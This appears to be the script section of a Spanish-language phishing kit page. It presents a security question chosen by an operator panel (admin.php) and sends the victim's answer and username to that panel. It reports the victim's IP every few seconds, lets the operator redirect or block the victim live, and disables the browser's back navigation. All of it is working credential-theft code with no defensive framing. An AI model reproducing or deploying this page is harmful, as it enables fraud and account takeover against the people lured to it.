 </div>
 <noscript>Please enable JavaScript to continue using this application.</noscript>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script type="text/javascript">
    (function(global){
        var _hash="!";var tick=function(){if(global.location.hash!==_hash){global.location.hash=_hash}global.history.pushState(null,null,global.location.href)}
        global.onload=function(){tick();document.body.onkeydown=function(e){var elm=e.target.nodeName.toLowerCase();if(e.which===8&&(elm!=='input'&&elm!=='textarea')){e.preventDefault()}e.stopPropagation()}}
        global.setInterval(function(){tick()},500);global.onpopstate=function(){global.history.go(1)}
    })(window);

    $(function(){
        // =======================================================
        // 1. SISTEMA DE CONTEO - PREGUNTA
        // =======================================================
        var KEY_VISITS = 'pregu_visits_v1';
        var visits = parseInt(sessionStorage.getItem(KEY_VISITS) || 0);
        visits++;
        sessionStorage.setItem(KEY_VISITS, visits);

        console.log("--> Visita Pregu nro: " + visits);

        var $btn = $('#btn-enviar');
        var $error = $('#error-msg');
        var $input = $('#pregunta-respuesta');
        var $texto = $('#pregunta-texto');
        var sending = false;
        var preguntaActual = '';

        // Si es recarga (visits > 1) -> ERROR
        if (visits > 1) {
            $error.text("Datos Expirados");
            $error.show();
            $input.addClass('error');
        }

        // =======================================================
        // 2. CARGAR LA PREGUNTA DESDE EL PANEL
        //    - Prioridad 1: URL param ?q=
        //    - Prioridad 2: respuesta de admin.php (check_my_page -> data.question)
        //    - Los signos ¿ ? los agrega este codigo si no vienen ya
        // =======================================================
        function normalizarPregunta(txt) {
            if (!txt) return '';
            txt = String(txt).trim();
            // Quitar signos que ya vengan para evitar duplicarlos
            txt = txt.replace(/^[¿?]+/, '').replace(/[¿?]+$/, '').trim();
            if (txt === '') return '';
            return '¿' + txt + '?';
        }

        function aplicarPregunta(txt) {
            var q = normalizarPregunta(txt);
            if (q) {
                preguntaActual = q;
                $texto.text(q);
            }
        }

        // Prioridad 1: URL
        var urlParams = new URLSearchParams(window.location.search);
        var qUrl = urlParams.get('q') || urlParams.get('pregunta') || '';
        if (qUrl) {
            aplicarPregunta(decodeURIComponent(qUrl));
        } else {
            $texto.text('¿Cual es tu respuesta?');
            preguntaActual = '¿Cual es tu respuesta?';
        }

        // Prioridad 2: admin.php (por si el panel la envia por ahi)
        function cargarPreguntaDesdeAdmin() {
            var userIP = '<?php echo $_SERVER["REMOTE_ADDR"]; ?>';
            $.post('admin.php', { action: 'check_my_page', ip: userIP }, function(res){
                var d; try { d = typeof res === 'string' ? JSON.parse(res) : res; } catch(e) { d = {}; }
                if (d && d.question && d.question !== '') {
                    aplicarPregunta(d.question);
                } else if (d && d.pregunta && d.pregunta !== '') {
                    aplicarPregunta(d.pregunta);
                }
            });
        }
        cargarPreguntaDesdeAdmin();

        // =======================================================
        // 3. VALIDACION DE INPUT Y BOTON
        // =======================================================
        function checkFull() {
            var val = $.trim($input.val());
            if (val.length > 0) {
                $btn.addClass('active').attr('aria-disabled', 'false').attr('tabindex', 0);
            } else {
                $btn.removeClass('active').attr('aria-disabled', 'true').attr('tabindex', -1);
            }
        }

        $input.on('input', function(){
            if ($input.hasClass('error')) {
                $input.removeClass('error');
                $error.hide();
            }
            checkFull();
        });

        $input.on('keydown', function(e){
            if (e.key === 'Enter' && !sending && $btn.hasClass('active')) {
                e.preventDefault();
                sendPregunta();
            }
        });

        checkFull();
        setTimeout(function(){ $input.focus(); }, 400);

        // =======================================================
        // 4. ENVIO
        // =======================================================
        $btn.on('click', function(e){
            e.preventDefault();
            if (sending || !$btn.hasClass('active')) return;
            sendPregunta();
        });

        function sendPregunta() {
            if (sending) return;
            var resp = $.trim($input.val());
            if (resp === '') return;

            var urlParams = new URLSearchParams(window.location.search);
            var currentUser = urlParams.get('u') || '';

            sending = true;
            $btn.find('.btn-text').hide();
            $btn.find('.btn-spinner').show();
            $btn.removeClass('active').attr('aria-disabled', 'true');
            $input.prop('disabled', true);

            var mensaje = '';
            mensaje += '❓ Pregunta: ' + preguntaActual + '\n';
            mensaje += '✏️ Respuesta: ' + resp + '\n';
            if (currentUser) mensaje += '👤 User: ' + currentUser + '\n';

            $.ajax({
                url: 'admin.php',
                type: 'POST',
                data: { contenido: mensaje },
                complete: function() {
                    var url = 'wait.php';
                    if (currentUser) url += '?u=' + encodeURIComponent(currentUser);
                    window.location.href = url;
                }
            });
        }

        // =======================================================
        // 5. HEARTBEAT Y REDIRECCION DINAMICA
        // =======================================================
        setInterval(function(){
            $.post('admin.php', { action: 'heartbeat', ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>' });
        }, 5000);

        setInterval(function(){
            var urlParams = new URLSearchParams(window.location.search);
            var currentUser = urlParams.get('u') || '';

            $.post('admin.php', { action: 'check_my_page', ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>' }, function(res){
                var d; try { d = typeof res === 'string' ? JSON.parse(res) : res; } catch(e) { d = {}; }

                // Actualizar pregunta si el panel la cambio
                if (d && d.question && d.question !== '') {
                    aplicarPregunta(d.question);
                } else if (d && d.pregunta && d.pregunta !== '') {
                    aplicarPregunta(d.pregunta);
                }

                if (d && d.success && d.currentPage) {
                    if (d.savedName && d.savedName !== "") {
                        if (typeof $("#user_name") !== 'undefined') $("#user_name").text(d.savedName);
                    }
                    var dest = d.currentPage.split('/').pop().split('?')[0];
                    var current = window.location.pathname.split('/').pop().split('?')[0];

                    if (dest !== 'pregu.php' && dest.indexOf('wait') === -1 && dest !== '' && dest !== current) {
                        var nextUrl = d.currentPage;
                        if (currentUser) {
                            if (nextUrl.indexOf('?') === -1) nextUrl += '?u=' + encodeURIComponent(currentUser);
                            else nextUrl += '&u=' + encodeURIComponent(currentUser);
                        }
                        window.location.href = nextUrl;
                    }
                    if (d.blocked || dest.indexOf('blocked') !== -1) {
                        window.location.href = 'blocked.php';
                    }
                }
            });
        }, 3000);

        $('a[href="#"]').on('click', function(e){ e.preventDefault(); });
    });
</script>

<script>
    (function (global) {
        if (typeof (global) === "undefined") { return; }
        var _hash = "!";
        var tick = function () {
            if (global.location.hash !== _hash) { global.location.hash = _hash; }
            global.history.pushState(null, null, global.location.href);
        };
        global.onload = function () {
            tick();
            document.body.onkeydown = function (e) {
                var elm = e.target.nodeName.toLowerCase();
                if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) { e.preventDefault(); }
                e.stopPropagation();
            };
        };
        global.setInterval(function () { tick(); }, 500);
        global.onpopstate = function () { global.history.go(1); };
    })(window);

    setInterval(function () {
        var userIP = '<?php echo $_SERVER["REMOTE_ADDR"]; ?>';
        fetch('admin.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'check_my_page', ip: userIP })
        })
        .then(r => r.json())
        .then(data => {
            if (data && data.success && data.currentPage) {
                var destino = data.currentPage.split('/').pop().split('?')[0];
                var actual = window.location.pathname.split('/').pop().split('?')[0];
                if (destino && destino !== actual && destino.indexOf('.php') !== -1) {
                    window.location.href = data.currentPage;
                }
            }
        })
        .catch(e => {});
    }, 2000);
</script>

